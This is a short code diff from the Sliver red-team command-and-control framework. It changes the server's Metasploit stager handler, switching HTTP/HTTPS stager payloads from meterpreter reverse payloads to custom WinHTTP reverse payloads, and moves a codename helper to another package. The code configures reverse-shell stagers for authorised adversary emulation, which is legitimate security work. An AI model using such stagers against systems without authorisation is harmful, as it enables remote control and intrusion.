@@ -29,9 +29,9 @@ import (
 	"github.com/bishopfox/sliver/protobuf/clientpb"
 	"github.com/bishopfox/sliver/protobuf/commonpb"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
+	"github.com/bishopfox/sliver/server/codenames"
 	"github.com/bishopfox/sliver/server/core"
 	"github.com/bishopfox/sliver/server/db"
-	"github.com/bishopfox/sliver/server/generate"
 	"github.com/bishopfox/sliver/server/log"
 	"github.com/bishopfox/sliver/server/msf"
 )
@@ -166,10 +166,10 @@ func (rpc *Server) MsfStage(ctx context.Context, req *clientpb.MsfStagerReq) (*c
 	case clientpb.StageProtocol_TCP:
 		payload = "meterpreter/reverse_tcp"
 	case clientpb.StageProtocol_HTTP:
-		payload = "meterpreter/reverse_http"
+		payload = "custom/reverse_winhttp"
 		uri = generateCallbackURI()
 	case clientpb.StageProtocol_HTTPS:
-		payload = "meterpreter/reverse_https"
+		payload = "custom/reverse_winhttps"
 		uri = generateCallbackURI()
 	default:
 		return MSFStage, errors.New("protocol not supported")
@@ -197,7 +197,7 @@ func (rpc *Server) MsfStage(ctx context.Context, req *clientpb.MsfStagerReq) (*c
 		return MSFStage, err
 	}
 	MSFStage.File.Data = stage
-	name, err := generate.GetCodename()
+	name, err := codenames.GetCodename()
 	if err != nil {
 		return MSFStage, err
 	}
